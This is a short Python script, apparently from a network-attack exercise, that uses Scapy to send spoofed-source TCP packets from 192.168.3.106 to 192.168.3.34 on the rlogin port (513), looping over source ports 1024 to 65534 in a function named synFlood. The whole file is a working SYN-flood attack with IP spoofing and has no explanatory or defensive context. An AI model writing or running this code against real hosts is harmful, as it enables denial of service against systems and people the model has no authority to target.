from scapy.all import *

def synFlood(src,tgt):
	for sport in range(1024,65535):
		IPlayer = IP(src=src,dst=tgt)
		TCPlayer = TCP(sport=sport,dport=513)
		pkt = IPlayer/TCPlayer
		send(pkt)

src= '192.168.3.106'
tgt= '192.168.3.34'
synFlood(src,tgt)